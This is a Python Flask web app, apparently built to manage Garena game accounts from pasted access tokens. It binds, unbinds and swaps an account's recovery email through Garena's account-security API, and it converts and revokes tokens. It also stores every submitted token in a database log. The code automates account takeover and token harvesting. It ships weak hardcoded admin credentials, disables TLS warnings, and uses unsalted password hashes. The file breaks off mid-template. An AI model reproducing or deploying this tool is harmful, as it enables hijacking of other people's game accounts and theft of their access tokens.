#!/usr/bin/env python3
"""
Garena Bind Tool - Web Version
Deploy: Render / GitHub
Author: Modified for @M1NXGAMINGVIP1
"""

import os, sys, json, time, hashlib, secrets, base64
import urllib.parse, sqlite3
from datetime import datetime, timedelta
from functools import wraps

import requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from flask import (Flask, request, session, redirect, url_for,
                   render_template_string, flash, g)
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ---------- Protobuf (optional) ----------
try:
    import MajoRLogin_pb2 as mLpB
    import MajorLoginRes_pb2 as mLrPb
    PROTO_AVAILABLE = True
except ImportError:
    PROTO_AVAILABLE = False

# ================= CONFIG =================
SECRET_KEY     = os.environ.get('SECRET_KEY', 'garena_bindtool_secure_secret_key_v1_change_me_please')
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', '12')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', '1')
DATABASE       = os.environ.get('DATABASE_PATH', 'bindtool.db')

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.permanent_session_lifetime = timedelta(days=3650)  # ~10 years = "life-time login"

# ================= DATABASE =================
def init_db():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        is_admin INTEGER DEFAULT 0,
        created_at TEXT,
        last_login TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS token_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT,
        feature TEXT,
        access_token TEXT,
        details TEXT,
        status TEXT,
        timestamp TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

def db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def hash_pw(p):
    return hashlib.sha256(p.encode()).hexdigest()

def log_token(username, feature, access_token, details="", status="attempt"):
    try:
        conn = db()
        conn.execute(
            "INSERT INTO token_logs (username, feature, access_token, details, status, timestamp) VALUES (?,?,?,?,?,?)",
            (username, feature, access_token, details, status, datetime.now().isoformat(timespec='seconds')))
        conn.commit(); conn.close()
    except Exception as e:
        print(f"[log err] {e}")

@app.before_request
def auto_restore_user():
    """If DB was reset (Render free tier) but session cookie still valid → restore user."""
    if request.endpoint in (None, 'static'): return
    if 'username' in session and not session.get('is_admin') and 'password_hash' in session:
        try:
            conn = db()
            row = conn.execute("SELECT id FROM users WHERE username=?", (session['username'],)).fetchone()
            if not row:
                conn.execute("INSERT INTO users (username, password_hash, is_admin, created_at) VALUES (?,?,0,?)",
                             (session['username'], session['password_hash'], datetime.now().isoformat()))
                conn.commit()
            conn.close()
        except: pass

# ================= AUTH DECORATORS =================
def login_required(f):
    @wraps(f)
    def w(*a, **k):
        if 'username' not in session:
            return redirect(url_for('login'))
        return f(*a, **k)
    return w

def admin_required(f):
    @wraps(f)
    def w(*a, **k):
        if 'username' not in session:
            return redirect(url_for('login'))
        if not session.get('is_admin'):
            flash('Admin access required', 'error')
            return redirect(url_for('dashboard'))
        return f(*a, **k)
    return w

# ================= UI BASE =================
BASE_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{{ title }} - Garena Bind Tool</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0e1a;color:#e0e0e0;min-height:100vh;line-height:1.6}
nav{background:linear-gradient(135deg,#1a1f35,#2a3050);padding:14px 22px;display:flex;gap:14px;align-items:center;border-bottom:2px solid #7c3aed;flex-wrap:wrap;position:sticky;top:0;z-index:99}
nav a{color:#c4b5fd;text-decoration:none;padding:8px 14px;border-radius:6px;font-size:.92em;transition:.2s}
nav a:hover{background:rgba(124,58,237,.3);color:#fff}
nav .brand{font-weight:700;color:#a78bfa;font-size:1.05em}
nav .spacer{flex:1}
nav .user{color:#fbbf24;font-weight:600}
.container{max-width:960px;margin:28px auto;padding:0 18px}
h1{color:#a78bfa;font-size:1.7em;margin-bottom:20px;padding-bottom:10px;border-bottom:2px solid #7c3aed}
h2{color:#c4b5fd;font-size:1.2em;margin:18px 0 12px}
.card{background:#151a2e;border:1px solid #2a3050;border-radius:10px;padding:22px;margin-bottom:18px}
input,button,select{font-family:inherit;font-size:1em}
input[type=text],input[type=password],input[type=email]{width:100%;padding:12px 14px;background:#0a0e1a;border:1px solid #2a3050;border-radius:6px;color:#e0e0e0;margin-bottom:14px;outline:none;transition:.2s}
input:focus{border-color:#7c3aed;box-shadow:0 0 0 3px rgba(124,58,237,.2)}
button,.btn{padding:12px 26px;background:linear-gradient(135deg,#7c3aed,#9333ea);color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:600;text-decoration:none;display:inline-block;transition:.2s}
button:hover,.btn:hover{opacity:.9;transform:translateY(-1px)}
.btn-secondary{background:#374151}
.menu-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:14px;margin-top:16px}
.menu-item{background:#151a2e;border:1px solid #2a3050;border-radius:10px;padding:20px;text-decoration:none;color:#e0e0e0;text-align:center;transition:.2s;display:block}
.menu-item:hover{border-color:#7c3aed;transform:translateY(-3px);background:#1d2440}
.menu-item .num{font-size:1.4em;color:#a78bfa;display:block;margin-bottom:6px;font-weight:700}
.menu-item .label{font-size:.92em}
.flash{padding:12px 18px;border-radius:6px;margin-bottom:16px;font-size:.92em}
.flash-success{background:rgba(34,197,94,.12);border:1px solid #22c55e;color:#86efac}
.flash-error{background:rgba(239,68,68,.12);border:1px solid #ef4444;color:#fca5a5}
.flash-info{background:rgba(59,130,246,.12);border:1px solid #3b82f6;color:#93c5fd}
.result{background:#0a0e1a;border:1px solid #2a3050;border-radius:8px;padding:16px;margin-top:16px}
.row{display:flex;padding:8px 0;border-bottom:1px solid #1e2440;font-size:.94em;flex-wrap:wrap}
.row:last-child{border-bottom:none}
.lbl{color:#a78bfa;min-width:170px;font-weight:600}
.val{color:#e0e0e0;word-break:break-all;flex:1}
table{width:100%;border-collapse:collapse;background:#151a2e;border-radius:8px;overflow:hidden;font-size:.9em}
th{background:#2a3050;padding:12px;text-align:left;color:#a78bfa;font-size:.85em;text-transform:uppercase;letter-spacing:.5px}
td{padding:11px 12px;border-bottom:1px solid #1e2440;vertical-align:top}
tr:hover td{background:rgba(124,58,237,.06)}
.mono{font-family:'Consolas',monospace;font-size:.82em;max-width:340px;word-break:break-all}
.ok{color:#22c55e;font-weight:600}
.bad{color:#ef4444;font-weight:600}
.hint{color:#94a3b8;font-size:.85em;margin-top:-8px;margin-bottom:14px}
.divider{height:1px;background:#2a3050;margin:20px 0}
.chip{display:inline-block;padding:3px 10px;border-radius:20px;font-size:.78em;background:#2a3050;color:#c4b5fd;margin:2px}
a.link{color:#a78bfa;text-decoration:underline}
@media(max-width:600px){.lbl{min-width:100%}.menu-grid{grid-template-columns:1fr 1fr}}
</style></head>
<body>
{% if username %}
<nav>
  <a class="brand" href="{{ url_for('dashboard') }}">⚡ Bind Tool</a>
  <a href="{{ url_for('dashboard') }}">Dashboard</a>
  {% if is_admin %}<a href="{{ url_for('admin_panel') }}">👑 Admin</a>{% endif %}
  <a href="{{ url_for('my_tokens') }}">📋 My Tokens</a>
  <span class="spacer"></span>
  <span class="user">{% if is_admin %}👑 {% endif %}{{ username }}</span>
  <a href="{{ url_for('logout') }}">🚪 Logout</a>
</nav>
{% endif %}
<div class="container">
{% with messages = get_flashed_messages(with_categories=true) %}
  {% for cat,msg in messages %}<div class="flash flash-{{ cat }}">{{ msg }}</div>{% endfor %}
{% endwith %}
<h1>{{ title }}</h1>
{{ content|safe }}
</div>
</body></html>'''

def render_page(title, content_tpl, **kw):
    content = render_template_string(content_tpl, **kw)
    return render_template_string(BASE_HTML, title=title, content=content,
                                   username=session.get('username'),
                                   is_admin=session.get('is_admin', False))

# ================= HELPERS =================
def parse_api(resp_text):
    try:
        d = json.loads(resp_text)
        if d.get('result') == 0:
            return {'ok': True, 'data': d}
        return {'ok': False, 'err': d.get('error', f"Code {d.get('result')}"), 'data': d}
    except:
        if '"result": 0' in resp_text.replace(' ', ''):
            return {'ok': True, 'data': {}}
        return {'ok': False, 'err': resp_text[:200], 'data': {}}

def convert_secs(s):
    try: s = int(s)
    except: return str(s)
    d, h = divmod(s, 86400); h, m = divmod(h, 3600); m, s = divmod(m, 60)
    return f"{d}d {h}h {m}m {s}s"

def fetch_player(access_token):
    try:
        url = f"https://api-otrss.garena.com/support/callback/?access_token={access_token}"
        r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=15, allow_redirects=True)
        q = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query)
        return {
            'uid':      q.get("account_id", ["Unknown"])[0],
            'nickname': q.get("nickname",   ["Unknown"])[0],
            'region':   q.get("region",     ["Unknown"])[0],
        }
    except Exception as e:
        return {'error': str(e)}

def fetch_bind_info(access_token):
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        r = requests.get(url, params={'app_id': "100067", 'access_token': access_token},
                         headers={'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)"},
                         timeout=15)
        if r.status_code != 200:
            return {'error': f"HTTP {r.status_code}"}
        d = r.json()
        return {
            'email':        d.get("email", ""),
            'email_to_be':  d.get("email_to_be", ""),
            'countdown':    d.get("request_exec_countdown", 0),
            'result':       d.get("result", -1),
        }
    except Exception as e:
        return {'error': str(e)}

# ================= AUTH ROUTES =================
@app.route('/')
def index():
    return redirect(url_for('dashboard') if 'username' in session else url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    if request.method == 'POST':
        u = request.form.get('username', '').strip()
        p = request.form.get('password', '').strip()
        if not u or not p:
            flash('Username and Password required', 'error')
        elif u == ADMIN_USERNAME and p == ADMIN_PASSWORD:
            session.permanent = True
            session['username'] = u
            session['password_hash'] = hash_pw(p)
            session['is_admin'] = True
            log_token(u, 'login', '-', 'admin login', 'success')
            flash(f'Welcome Admin {u}!', 'success')
            return redirect(url_for('dashboard'))
        else:
            conn = db()
            row = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
            if row and row['password_hash'] == hash_pw(p):
                conn.execute("UPDATE users SET last_login=? WHERE id=?", (datetime.now().isoformat(), row['id']))
                conn.commit(); conn.close()
                session.permanent = True
                session['username'] = u
                session['password_hash'] = row['password_hash']
                session['is_admin'] = False
                log_token(u, 'login', '-', 'user login', 'success')
                flash(f'Welcome back, {u}!', 'success')
                return redirect(url_for('dashboard'))
            conn.close()
            flash('Invalid credentials', 'error')

    tpl = '''
    <div class="card" style="max-width:420px;margin:0 auto">
      <form method="POST">
        <input type="text"     name="username" placeholder="Username" required autofocus>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" style="width:100%">🔐 Login</button>
      </form>
      <div class="divider"></div>
      <p style="text-align:center;font-size:.9em;color:#94a3b8">
        New here? <a class="link" href="{{ url_for('register') }}">Create account</a>
      </p>
    </div>'''
    return render_page('Login', tpl)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        u = request.form.get('username', '').strip()
        p = request.form.get('password', '').strip()
        if not u or not p:
            flash('All fields required', 'error')
        elif len(u) < 3 or len(p) < 3:
            flash('Username & password must be ≥ 3 chars', 'error')
        elif u == ADMIN_USERNAME:
            flash('This username is reserved', 'error')
        else:
            try:
                conn = db()
                conn.execute("INSERT INTO users (username,password_hash,is_admin,created_at,last_login) VALUES (?,?,0,?,?)",
                             (u, hash_pw(p), datetime.now().isoformat(), datetime.now().isoformat()))
                conn.commit(); conn.close()
                session.permanent = True
                session['username'] = u
                session['password_hash'] = hash_pw(p)
                session['is_admin'] = False
                log_token(u, 'register', '-', 'new user', 'success')
                flash('Account created! Welcome 🎉', 'success')
                return redirect(url_for('dashboard'))
            except sqlite3.IntegrityError:
                flash('Username already exists', 'error')

    tpl = '''
    <div class="card" style="max-width:420px;margin:0 auto">
      <form method="POST">
        <input type="text"     name="username" placeholder="Choose Username" required autofocus>
        <input type="password" name="password" placeholder="Choose Password" required>
        <button type="submit" style="width:100%">✨ Register</button>
      </form>
      <div class="divider"></div>
      <p style="text-align:center;font-size:.9em;color:#94a3b8">
        Already have an account? <a class="link" href="{{ url_for('login') }}">Login</a>
      </p>
    </div>'''
    return render_page('Register', tpl)

@app.route('/logout')
def logout():
    u = session.get('username', 'unknown')
    session.clear()
    flash(f'Logged out ({u})', 'info')
    return redirect(url_for('login'))

# ================= DASHBOARD =================
@app.route('/dashboard')
@login_required
def dashboard():
    items = [
        ('/feature/bind_info',        '1',  'Check Bind Info'),
        ('/feature/bind_email',       '2',  'Bind Email'),
        ('/feature/unbind_email',     '3',  'Unbind Email'),
        ('/feature/change_bind',      '4',  'Change Bind Email'),
        ('/feature/cancel_bind',      '5',  'Cancel Bind Request'),
        ('/feature/eat_to_token',     '6',  'EAT → Access Token'),
        ('/feature/revoke_token',     '7',  'Revoke Access Token'),
        ('/feature/login_history',    '8',  'Login History'),
        ('/feature/bound_accounts',   '9',  'Platform Binds'),
        ('/my_tokens',                '10', 'My Token Logs'),
    ]
    if session.get('is_admin'):
        items.append(('/admin', '👑', 'Admin Panel'))
    cards = ''.join(f'<a class="menu-item" href="{u}"><span class="num">{n}</span><span class="label">{l}</span></a>'
                    for u, n, l in items)
    tpl = f'<div class="menu-grid">{cards}</div>'
    return render_page('Dashboard', tpl)

# ================= FEATURE: CHECK BIND INFO =================
@app.route('/feature/bind_info', methods=['GET', 'POST'])
@login_required
def feature_bind_info():
    result = None
    if request.method == 'POST':
        token = request.form.get('access_token', '').strip()
        if not token:
            flash('Access token required', 'error')
        else:
            player = fetch_player(token)
            bind = fetch_bind_info(token)
            log_token(session['username'], 'bind_info', token,
                      f"nick={player.get('nickname','?')}", 'used')
            result = {'player': player, 'bind': bind}

    tpl = '''
    <div class="card">
      <form method="POST">
        <input type="text" name="access_token" placeholder="Enter Access Token" required>
        <button type="submit">🔍 Check</button>
      </form>
    </div>
    {% if result %}
      <div class="card">
        <h2>Player Info</h2>
        <div class="result">
          {% if result.player.error %}
            <span class="bad">Error: {{ result.player.error }}</span>
          {% else %}
            <div class="row"><span class="lbl">UID</span><span class="val">{{ result.player.uid }}</span></div>
            <div class="row"><span class="lbl">Nickname</span><span class="val">{{ result.player.nickname }}</span></div>
            <div class="row"><span class="lbl">Region</span><span class="val">{{ result.player.region }}</span></div>
          {% endif %}
        </div>
        <h2 style="margin-top:20px">Bind Info</h2>
        <div class="result">
          {% if result.bind.error %}
            <span class="bad">Error: {{ result.bind.error }}</span>
          {% else %}
            <div class="row"><span class="lbl">Current Email</span><span class="val">{{ result.bind.email or "None" }}</span></div>
            <div class="row"><span class="lbl">Pending Email</span><span class="val">{{ result.bind.email_to_be or "None" }}</span></div>
            {% if result.bind.email_to_be %}
            <div class="row"><span class="lbl">Countdown</span><span class="val">{{ result.bind.countdown|human_secs }}</span></div>
            {% endif %}
            <div class="row"><span class="lbl">Status</span>
              <span class="val {% if result.bind.result == 0 %}ok{% else %}bad{% endif %}">
                {% if result.bind.result == 0 %}✓ SUCCESS{% else %}✗ FAILED (code {{ result.bind.result }}){% endif %}
              </span></div>
          {% endif %}
        </div>
      </div>
    {% endif %}'''
    return render_page('Check Bind Info', tpl, result=result)

@app.template_filter('human_secs')
def _hs(s): return convert_secs(s)

# ================= FEATURE: BIND EMAIL =================
@app.route('/feature/bind_email', methods=['GET', 'POST'])
@login_required
def feature_bind_email():
    result = None; error = None; step_to_show = 1

    if request.method == 'POST':
        step = request.form.get('step', '1')
        if step == '1':
            token = request.form.get('access_token', '').strip()
            email = request.form.get('email', '').strip()
            if not token or not email:
                error = 'Token & Email required'
            else:
                try:
                    h = {"User-Agent": "GarenaMSDK/4.0.30",
                         "Content-Type": "application/x-www-form-urlencoded"}
                    r = requests.post("https://100067.connect.garena.com/game/account_security/bind:send_otp",
                                      headers=h, data={"email": email, "locale": "en_PK",
                                                       "region": "PK", "app_id": "100067",
                                                       "access_token": token}, timeout=15)
                    p = parse_api(r.text)
                    log_token(session['username'], 'bind_email_otp', token,
                              f"email={email} | {'ok' if p['ok'] else p['err']}",
                              'success' if p['ok'] else 'failed')
                    if p['ok']:
                        session['bind_email_flow'] = {'token': token, 'email': email}
                        step_to_show = 2
                        result = {'msg': f"✓ OTP sent to {email}"}
                    else:
                        error = f"Send OTP failed: {p['err']}"
                except Exception as e:
                    error = str(e)

        elif step == '2':
            flow = session.get('bind_email_flow')
            if not flow:
                error = 'Session expired. Start over.'
            else:
                otp  = request.form.get('otp', '').strip()
                sc   = request.form.get('security_code', '').strip()
                if not otp or not sc:
                    error = 'OTP & security code required'
                    step_to_show = 2
                else:
                    try:
                        h = {"User-Agent": "GarenaMSDK/4.0.30",
                             "Content-Type": "application/x-www-form-urlencoded"}
                        # verify
                        r1 = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_otp",
                                           headers=h, data={"app_id": "100067", "access_token": flow['token'],
                                                            "email": flow['email'], "code": otp, "otp": otp,
                                                            "type": "1"}, timeout=15)
                        p1 = parse_api(r1.text)
                        if not p1['ok']:
                            error = f"OTP verify failed: {p1['err']}"
                            step_to_show = 2
                        else:
                            vt = p1['data'].get('verifier_token', '')
                            # bind
                            r2 = requests.post("https://100067.connect.garena.com/game/account_security/bind:create_bind_request",
                                               headers=h, data={"email": flow['email'], "app_id": "100067",
                                                                "access_token": flow['token'],
                                                                "verifier_token": vt,
                                                                "secondary_password": sc}, timeout=15)
                            p2 = parse_api(r2.text)
                            log_token(session['username'], 'bind_email_final', flow['token'],
                                      f"email={flow['email']} | {'ok' if p2['ok'] else p2['err']}",
                                      'success' if p2['ok'] else 'failed')
                            if p2['ok']:
                                result = {'msg': f"✓ Successfully bound {flow['email']}"}
                                session.pop('bind_email_flow', None)
                            else:
                                error = f"Bind failed: {p2['err']}"
                                step_to_show = 2
                    except Exception as e:
                        error = str(e)
                        step_to_show = 2
    else:
        if session.get('bind_email_flow'):
            step_to_show = 2

    tpl = '''
    {% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}
    {% if result %}<div class="flash flash-success">{{ result.msg }}</div>{% endif %}
    <div class="card">
    {% if step_to_show == 1 %}
      <h2>Step 1: Send OTP</h2>
      <form method="POST">
        <input type="hidden" name="step" value="1">
        <input type="text" name="access_token" placeholder="Access Token" required>
        <input type="email" name="email" placeholder="Email to bind" required>
        <button type="submit">📧 Send OTP</button>
      </form>
    {% else %}
      <h2>Step 2: Verify & Set Security Code</h2>
      <form method="POST">
        <input type="hidden" name="step" value="2">
        <input type="text" name="otp" placeholder="OTP from email" required>
        <input type="text" name="security_code" placeholder="Set 6-digit security code" required maxlength="6">
        <button type="submit">✅ Verify & Bind</button>
      </form>
    {% endif %}
    </div>'''
    return render_page('Bind Email', tpl, result=result, error=error, step_to_show=step_to_show)

# ================= FEATURE: UNBIND EMAIL =================
@app.route('/feature/unbind_email', methods=['GET', 'POST'])
@login_required
def feature_unbind_email():
    result = None; error = None
    state = session.get('unbind_state')

    if request.method == 'POST':
        action = request.form.get('action', '')

        if action == 'start':
            method = request.form.get('method', 'otp')
            token = request.form.get('access_token', '').strip()
            if not token:
                error = 'Token required'
            else:
                info = fetch_bind_info(token)
                email = info.get('email', '')
                if not email:
                    error = 'No email bound to this account'
                elif method == 'otp':
                    try:
                        h = {"User-Agent": "GarenaMSDK/4.0.30",
                             "Content-Type": "application/x-www-form-urlencoded"}
                        r = requests.post("https://100067.connect.garena.com/game/account_security/bind:send_otp",
                                          headers=h, data={"email": email, "locale": "en_PK", "region": "PK",
                                                           "app_id": "100067", "access_token": token}, timeout=15)
                        p = parse_api(r.text)
                        if p['ok']:
                            session['unbind_state'] = {'token': token, 'email': email, 'method': 'otp'}
                            state = session['unbind_state']
                            result = {'msg': f"✓ OTP sent to {email}"}
                        else:
                            error = f"Send OTP failed: {p['err']}"
                    except Exception as e:
                        error = str(e)
                else:  # security code
                    session['unbind_state'] = {'token': token, 'email': email, 'method': 'sc'}
                    state = session['unbind_state']

        elif action == 'verify_otp':
            if not state: error = 'Session expired'
            else:
                otp = request.form.get('otp', '').strip()
                try:
                    h = {"User-Agent": "GarenaMSDK/4.0.30",
                         "Content-Type": "application/x-www-form-urlencoded"}
                    r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                                      headers=h, data={"email": state['email'], "app_id": "100067",
                                                       "access_token": state['token'], "otp": otp}, timeout=15)
                    p = parse_api(r.text)
                    if p['ok'] and p['data'].get('identity_token'):
                        # unbind
                        r2 = requests.post("https://100067.connect.garena.com/game/account_security/bind:create_unbind_request",
                                           headers=h, data={"app_id": "100067", "access_token": state['token'],
                                                            "identity_token": p['data']['identity_token']}, timeout=15)
                        p2 = parse_api(r2.text)
                        log_token(session['username'], 'unbind_email', state['token'],
                                  f"email={state['email']} | {'ok' if p2['ok'] else p2['err']}",
                                  'success' if p2['ok'] else 'failed')
                        if p2['ok']:
                            result = {'msg': '✓ Unbind request created successfully'}
                            session.pop('unbind_state', None); state = None
                        else:
                            error = f"Unbind failed: {p2['err']}"
                    else:
                        error = f"Verify failed: {p.get('err', 'no identity token')}"
                except Exception as e:
                    error = str(e)

        elif action == 'verify_sc':
            if not state: error = 'Session expired'
            else:
                sc = request.form.get('security_code', '').strip()
                try:
                    h = {"User-Agent": "GarenaMSDK/4.0.30",
                         "Content-Type": "application/x-www-form-urlencoded"}
                    r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                                      headers=h, data={"email": state['email'], "app_id": "100067",
                                                       "access_token": state['token'],
                                                       "secondary_password": hashlib.sha256(sc.encode()).hexdigest()},
                                      timeout=15)
                    p = parse_api(r.text)
                    if p['ok'] and p['data'].get('identity_token'):
                        r2 = requests.post("https://100067.connect.garena.com/game/account_security/bind:create_unbind_request",
                                           headers=h, data={"app_id": "100067", "access_token": state['token'],
                                                            "identity_token": p['data']['identity_token']}, timeout=15)
                        p2 = parse_api(r2.text)
                        log_token(session['username'], 'unbind_email_sc', state['token'],
                                  f"email={state['email']} | {'ok' if p2['ok'] else p2['err']}",
                                  'success' if p2['ok'] else 'failed')
                        if p2['ok']:
                            result = {'msg': '✓ Unbind request created successfully'}
                            session.pop('unbind_state', None); state = None
                        else:
                            error = f"Unbind failed: {p2['err']}"
                    else:
                        error = f"Verify failed: {p.get('err', 'no identity token')}"
                except Exception as e:
                    error = str(e)

    tpl = '''
    {% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}
    {% if result %}<div class="flash flash-success">{{ result.msg }}</div>{% endif %}
    <div class="card">
    {% if not state %}
      <h2>Choose Method</h2>
      <form method="POST">
        <input type="hidden" name="action" value="start">
        <input type="text" name="access_token" placeholder="Access Token" required>
        <select name="method" style="width:100%;padding:12px;background:#0a0e1a;border:1px solid #2a3050;border-radius:6px;color:#e0e0e0;margin-bottom:14px">
          <option value="otp">Via OTP (email)</option>
          <option value="sc">Via Security Code</option>
        </select>
        <button type="submit">▶ Continue</button>
      </form>
    {% elif state.method == 'otp' %}
      <h2>Enter OTP sent to {{ state.email }}</h2>
      <form method="POST">
        <input type="hidden" name="action" value="verify_otp">
        <input type="text" name="otp" placeholder="OTP" required autofocus>
        <button type="submit">✅ Verify & Unbind</button>
      </form>
    {% else %}
      <h2>Enter Security Code</h2>
      <form method="POST">
        <input type="hidden" name="action" value="verify_sc">
        <input type="text" name="security_code" placeholder="6-digit security code" required autofocus maxlength="6">
        <button type="submit">✅ Verify & Unbind</button>
      </form>
    {% endif %}
    </div>'''
    return render_page('Unbind Email', tpl, result=result, error=error, state=state)

# ================= FEATURE: CHANGE BIND EMAIL =================
@app.route('/feature/change_bind', methods=['GET', 'POST'])
@login_required
def feature_change_bind():
    result = None; error = None
    state = session.get('change_bind_state')

    if request.method == 'POST':
        action = request.form.get('action', '')

        if action == 'start':
            token  = request.form.get('access_token', '').strip()
            method = request.form.get('method', 'otp')
            if not token: error = 'Token required'
            else:
                info = fetch_bind_info(token)
                old_email = info.get('email', '')
                if not old_email:
                    error = 'No email bound — cannot change'
                elif method == 'otp':
                    try:
                        h = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
                        r = requests.post("https://100067.connect.garena.com/game/account_security/bind:send_otp",
                                          headers=h, data={"email": old_email, "locale": "en_PK", "region": "PK",
                                                           "app_id": "100067", "access_token": token}, timeout=15)
                        p = parse_api(r.text)
                        if p['ok']:
                            session['change_bind_state'] = {'token': token, 'old_email': old_email, 'method': 'otp', 'stage': 'verify_old'}
                            state = session['change_bind_state']
                            result = {'msg': f"✓ OTP sent to {old_email}"}
                        else:
                            error = f"Send OTP failed: {p['err']}"
                    except Exception as e:
                        error = str(e)
                else:
                    session['change_bind_state'] = {'token': token, 'old_email': old_email, 'method': 'sc', 'stage': 'verify_old'}
                    state = session['change_bind_state']

        elif action == 'verify_old_otp':
            if not state: error = 'Session expired'
            else:
                otp = request.form.get('otp', '').strip()
                try:
                    h = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
                    r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                                      headers=h, data={"email": state['old_email'], "app_id": "100067",
                                                       "access_token": state['token'], "otp": otp}, timeout=15)
                    p = parse_api(r.text)
                    it = p['data'].get('identity_token') if p['ok'] else None
                    if it:
                        state['identity_token'] = it; state['stage'] = 'new_email'
                        session['change_bind_state'] = state
                        result = {'msg': '✓ Old identity verified. Enter new email.'}
                    else:
                        error = f"Verify failed: {p.get('err', 'no token')}"
                except Exception as e:
                    error = str(e)

        elif action == 'verify_old_sc':
            if not state: error = 'Session expired'
            else:
                sc = request.form.get('security_code', '').strip()
                try:
                    h = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
                    r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                                      headers=h, data={"email": state['old_email'], "app_id": "100067",
                                                       "access_token": state['token'],
                                                       "secondary_password": hashlib.sha256(sc.encode()).hexdigest()},
                                      timeout=15)
                    p = parse_api(r.text)
                    it = p['data'].get('identity_token') if p['ok'] else None
                    if it:
                        state['identity_token'] = it; state['stage'] = 'new_email'
                        session['change_bind_state'] = state
                        result = {'msg': '✓ Old identity verified. Enter new email.'}
                    else:
                        error = f"Verify failed: {p.get('err', 'no token')}"
                except Exception as e:
                    error = str(e)

        elif action == 'send_new_otp':
            if not state: error = 'Session expired'
            else:
                new_email = request.form.get('new_email', '').strip()
                if not new_email: error = 'New email required'
                else:
                    try:
                        h = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
                        r = requests.post("https://100067.connect.garena.com/game/account_security/bind:send_otp",
                                          headers=h, data={"email": new_email, "locale": "en_PK", "region": "PK",
                                                           "app_id": "100067", "access_token": state['token']}, timeout=15)
                        p = parse_api(r.text)
                        if p['ok']:
                            state['new_email'] = new_email; state['stage'] = 'verify_new'
                            session['change_bind_state'] = state
                            result = {'msg': f"✓ OTP sent to {new_email}"}
                        else:
                            error = f"Send OTP failed: {p['err']}"
                    except Exception as e:
                        error = str(e)

        elif action == 'finalize':
            if not state: error = 'Session expired'
            else:
                otp = request.form.get('otp', '').strip()
                try:
                    h = {"User-Agent": "GarenaMSDK/4.0.30", "Content-Type": "application/x-www-form-urlencoded"}
                    r = requests.post("https://100067.connect.garena.com/game/account_security/bind:verify_otp",
                                      headers=h, data={"email": state['new_email'], "app_id": "100067",
                                                       "access_token": state['token'], "otp": otp}, timeout=15)
                    p = parse_api(r.text)
                    vt = p['data'].get('verifier_token') if p['ok'] else None
                    if not vt:
                        error = f"Verify OTP failed: {p.get('err', 'no verifier')}"
                    else:
                        r2 = requests.post("https://100067.connect.garena.com/game/account_security/bind:create_rebind_request",
                                           headers=h, data={"identity_token": state['identity_token'],
                                                            "email": state['new_email'], "app_id": "100067",
                                                            "verifier_token": vt,
                                                            "access_token": state['token']}, timeout=15)
                        p2 = parse_api(r2.text)
                        log_token(session['username'], 'change_bind', state['token'],
                                  f"{state['old_email']} → {state['new_email']} | {'ok' if p2['ok'] else p2['err']}",
                                  'success' if p2['ok'] else 'failed')
                        if p2['ok']:
                            result = {'msg': f"✓ Rebind success: {state['new_email']}"}
                            session.pop('change_bind_state', None); state = None
                        else:
                            error = f"Rebind failed: {p2['err']}"
                except Exception as e:
                    error = str(e)

    tpl = '''
    {% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}
    {% if result %}<div class="flash flash-success">{{ result.msg }}</div>{% endif %}
    <div class="card">
    {% if not state %}
      <h2>Start Change</h2>
      <form method="POST">
        <input type="hidden" name="action" value="start">
        <input type="text" name="access_token" placeholder="Access Token" required>
        <select name="method" style="width:100%;padding:12px;background:#0a0e1a;border:1px solid #2a3050;border-radius:6px;color:#e0e0e0;margin-bottom:14px">
          <option value="otp">Verify Old Email via OTP</option>
          <option value="sc">Verify via Security Code</option>
        </select>
        <button type="submit">▶ Continue</button>
      </form>
    {% elif state.stage == 'verify_old' and state.method == 'otp' %}
      <h2>OTP to old email: {{ state.old_email }}</h2>
      <form method="POST">
        <input type="hidden" name="action" value="verify_old_otp">
        <input type="text" name="otp" placeholder="Old-email OTP" required autofocus>
        <button type="submit">✅ Verify</button>
      </form>
    {% elif state.stage == 'verify_old' and state.method == 'sc' %}
      <h2>Security Code Verification</h2>
      <form method="POST">
        <input type="hidden" name="action" value="verify_old_sc">
